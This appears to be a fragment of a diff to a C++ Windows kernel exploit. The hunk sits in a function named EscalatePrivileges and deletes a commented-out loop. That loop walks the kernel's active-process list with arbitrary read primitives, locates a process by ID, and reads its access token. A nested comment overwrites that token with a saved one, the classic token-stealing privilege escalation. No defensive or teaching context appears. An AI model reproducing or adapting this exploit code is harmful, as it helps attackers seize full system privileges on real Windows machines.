@@ -121,27 +121,6 @@ auto EscalatePrivileges() -> void {
 	
 	auto temp = initialProcess;
 
-	/*do {
-		auto currEntry = temp;
-		std::uint32_t currProc = 0;
-
-		ReadPrimitive(reinterpret_cast<std::uint32_t>(currEntry) - ACTIVE_PROCESS_LINKS_OFFSET, &currProc, sizeof std::uint32_t);
-		std::uint32_t currid = 0;
-		ReadPrimitive(currProc + ID_OFFSET, &currid, sizeof std::uint32_t);
-
-		if (pid == currid) {
-			std::uint32_t currToken = 0;
-			ReadPrimitive(currProc + TOKEN_OFFSET, &currToken, sizeof std::uint32_t);
-			std::printf("current token : %lx\n", currToken);
-
-			//WritePrimitive(currProc + TOKEN_OFFSET, &initialToken, sizeof std::uint32_t);
-			break;
-		}
-
-		temp = temp->Flink;
-	} while (((UCHAR*)temp - ACTIVE_PROCESS_LINKS_OFFSET) != ((UCHAR*)activeProcessLinks.Flink - ACTIVE_PROCESS_LINKS_OFFSET));*/
-
-
 	std::uint32_t res = 0;
 
 	while (TRUE) {
